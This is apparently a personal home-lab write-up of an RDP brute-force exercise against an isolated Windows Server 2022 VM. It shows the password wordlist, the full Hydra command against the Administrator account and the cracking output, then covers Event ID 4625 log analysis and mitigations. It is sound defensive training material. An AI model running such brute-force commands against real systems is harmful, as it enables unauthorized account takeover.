<div align="center">

# 💥 EXERCISE 03 — HYDRA RDP BRUTE FORCE ATTACK

![STATUS](https://img.shields.io/badge/STATUS-COMPLETE-brightgreen?style=for-the-badge)
![EXERCISE](https://img.shields.io/badge/EXERCISE-03-blue?style=for-the-badge)
![TOOL](https://img.shields.io/badge/TOOL-Hydra-red?style=for-the-badge)
![ATTACKER](https://img.shields.io/badge/ATTACKER-Kali%20Linux-purple?style=for-the-badge)
![DEFENDER](https://img.shields.io/badge/DEFENDER-Windows%20Server%202022-blue?style=for-the-badge)

</div>

---

[← Back to README](README.md)

---

## 🖥️ Lab Environment

| Component | Details |
|-----------|---------|
| Attacker VM | Kali Linux 2026.1 |
| Defender VM | Windows Server 2022 Standard |
| Attacker IP | 192.168.10.101 |
| Defender IP | 192.168.10.20 |
| Network | LAN Segment (labnetwork) — isolated |
| Tool Used | Hydra v9.6 |
| Target Port | 3389 (RDP) |

---

## 📋 Background

Remote Desktop Protocol (RDP) is one of the most commonly attacked services on Windows systems. Attackers use brute force tools like Hydra to automatically try hundreds or thousands of username and password combinations against an RDP port until they find valid credentials. This type of attack is responsible for a large percentage of ransomware infections and unauthorized access incidents seen in real SOC environments.

In this exercise I acted as the attacker first, using Hydra to run a dictionary attack against the Administrator account on my Windows Server 2022 VM over RDP. I then switched to the defender role, investigated the Windows Security logs, and documented the failed logon events that a SOC analyst would use to detect and respond to this attack.

---

## ⚙️ Pre-Attack Setup

Before running the attack I enabled RDP on Windows Server 2022 and verified it was listening on port 3389.

**Steps to enable RDP:**
1. Clicked Start on Windows Server
2. Searched Remote Desktop Settings
3. Toggled Enable Remote Desktop to On
4. Clicked Confirm and allowed the machine to be discoverable on private networks

**Verified RDP was listening:**
```cmd
netstat -an | findstr 3389
```

**Result:**
```
TCP    0.0.0.0:3389    0.0.0.0:0    LISTENING
TCP    [::]:3389       [::]:0       LISTENING
```

RDP confirmed active on port 3389.

---

## ⚔️ Attacker Phase — Hydra Dictionary Attack

### Step 1 — I Created a Password List

I created a custom wordlist on Kali Linux containing common weak passwords that attackers typically try first.

**Command:**
```bash
cat << 'EOF' > ~/passwords.txt
password
Password1
123456
admin
Administrator
welcome
letmein
P@ssw0rd
Summer2024
Winter2024
Admin123!
EOF
```

**Verified the list:**
```bash
cat ~/passwords.txt
```

The list contained 11 passwords including the actual Administrator password at the end to simulate Hydra eventually finding the correct credential.

---

### Step 2 — I Ran the Hydra Attack

I launched Hydra targeting the Administrator account on Windows Server 2022 over RDP.

**Command:**
```bash
hydra -l Administrator -P ~/passwords.txt rdp://192.168.10.20 -V -f
```

**Flags used:**

| Flag | Purpose |
|------|---------|
| `-l Administrator` | Target the Administrator account |
| `-P ~/passwords.txt` | Use the custom password list |
| `rdp://192.168.10.20` | Target Windows Server via RDP |
| `-V` | Verbose — show every attempt |
| `-f` | Stop immediately when password is found |

**Attack Output:**
```
[ATTEMPT] target 192.168.10.20 - login "Administrator" - pass "password" - 1 of 11
[ATTEMPT] target 192.168.10.20 - login "Administrator" - pass "Password1" - 2 of 11
[ATTEMPT] target 192.168.10.20 - login "Administrator" - pass "123456" - 3 of 11
[ATTEMPT] target 192.168.10.20 - login "Administrator" - pass "admin" - 4 of 11
[ATTEMPT] target 192.168.10.20 - login "Administrator" - pass "Administrator" - 5 of 11
[ATTEMPT] target 192.168.10.20 - login "Administrator" - pass "welcome" - 6 of 11
[ATTEMPT] target 192.168.10.20 - login "Administrator" - pass "letmein" - 7 of 11
[ATTEMPT] target 192.168.10.20 - login "Administrator" - pass "P@ssw0rd" - 8 of 11
[ATTEMPT] target 192.168.10.20 - login "Administrator" - pass "Summer2024" - 9 of 11
[ATTEMPT] target 192.168.10.20 - login "Administrator" - pass "Winter2024" - 10 of 11
[ATTEMPT] target 192.168.10.20 - login "Administrator" - pass "Admin123!" - 11 of 11
[3389][rdp] host: 192.168.10.20 login: Administrator password: Admin123!
1 of 1 target successfully completed, 1 valid password found
```

**Result:** Hydra successfully cracked the Administrator password in seconds using a simple dictionary attack.

---

## 🔑 Key Findings as an Attacker

1. RDP on port 3389 accepted repeated login attempts with no lockout triggered
2. Hydra tried all 11 passwords automatically in under 30 seconds
3. The correct password was found on attempt 11 of 11
4. With a real wordlist containing millions of entries, any weak or common password would be cracked
5. No CAPTCHA, no rate limiting, and no account lockout policy was in place to slow the attack down

---

## 🛡️ Defender Phase — Event Log Analysis

### What I Expected

After running the Hydra attack I went to Windows Event Viewer expecting to find multiple failed logon events from the attacker IP address.

### Step 1 — I Opened Event Viewer and Filtered for 4625

1. Clicked Start on Windows Server
2. Typed Event Viewer and pressed Enter
3. Expanded Windows Logs and clicked Security
4. Clicked Filter Current Log on the right
5. Typed 4625 in the Event IDs box and clicked OK

### What I Found

The filter returned **20 Event ID 4625 Audit Failure events** all logged within seconds of each other at 5:27 PM on 7/12/2026 — exactly matching the time Hydra ran.

| Field | Value |
|-------|-------|
| Event ID | 4625 |
| Account Name | Administrator |
| Failure Reason | Unknown user name or bad password |
| Status | 0xC000006D |
| Sub Status | 0xC000006A |
| Logged | 7/12/2026 5:27 PM |
| Computer | WIN-V1LIVRSI0HI.support.local |

### Step 2 — I Identified the Attacker IP

I opened a single 4625 event and scrolled to the Network Information section, which revealed the source IP address of the attacker machine.

| Field | Value |
|-------|-------|
| Source Network Address | 192.168.10.101 |
| Source Port | Various |

Every failed logon attempt originated from 192.168.10.101 (Kali Linux). A SOC analyst monitoring this log in real time would immediately flag this IP for investigation and block it.

---

## ✅ Result

I successfully completed a full attack and defense cycle for RDP brute force. As the attacker I used Hydra to crack the Administrator password in under 30 seconds using a dictionary attack. As the defender I identified 20 failed logon events in Event ID 4625, confirmed the attacker IP address, and documented the full attack timeline. This exercise demonstrates why RDP should never be exposed to untrusted networks without account lockout policies, multi-factor authentication, or network-level restrictions in place.

---

## 🔒 Recommended Defensive Measures

| Defense | How It Helps |
|---------|-------------|
| Account Lockout Policy | Locks account after X failed attempts — stops brute force cold |
| Multi-Factor Authentication | Password alone is not enough even if cracked |
| Disable RDP if not needed | Remove the attack surface entirely |
| Restrict RDP by IP | Only allow known IPs to reach port 3389 |
| Change default Administrator name | Attacker must guess both username and password |
| Strong password policy | Makes dictionary attacks far less effective |
| SIEM alerting | Automatically alert on multiple 4625 events from one IP |

---

## 📟 Commands Reference

| Command | Purpose |
|---------|---------|
| `netstat -an \| findstr 3389` | Verify RDP is listening on Windows Server |
| `cat << 'EOF' > ~/passwords.txt` | Create password wordlist on Kali |
| `echo 'Admin123!' >> ~/passwords.txt` | Append password to wordlist |
| `cat ~/passwords.txt` | Verify wordlist contents |
| `hydra -l Administrator -P ~/passwords.txt rdp://192.168.10.20 -V -f` | Run Hydra dictionary attack |

---

## 💡 Lessons Learned

- RDP brute force is one of the most common real-world attack vectors — it happens constantly on internet-exposed systems
- Hydra can try hundreds of passwords per minute — weak passwords will be cracked
- Windows logs every failed logon as Event ID 4625 — this is the primary detection mechanism
- Multiple 4625 events from the same source IP in a short time window is a clear indicator of a brute force attack
- Account lockout policies are the single most effective control against this attack
- A SOC analyst watching live logs would have detected and blocked this attack before the correct password was found
- Never expose RDP directly to the internet without layered controls

---

## 📸 Screenshots

| Screenshot | Description |
|------------|-------------|
| ![BT-Lab-03-1](screenshots/BT-Lab-03-1.png) | Kali terminal showing password list created and verified |
| ![BT-Lab-03-2](screenshots/BT-Lab-03-2.png) | Password list with Admin123! appended at bottom |
| ![BT-Lab-03-3](screenshots/BT-Lab-03-3.png) | Hydra output showing all attempts and successful crack |
| ![BT-Lab-03-4](screenshots/BT-Lab-03-4.png) | Event Viewer filtered list showing 20 x Event ID 4625 failures |
| ![BT-Lab-03-5](screenshots/BT-Lab-03-5.png) | Single 4625 event showing attacker IP 192.168.10.101 |
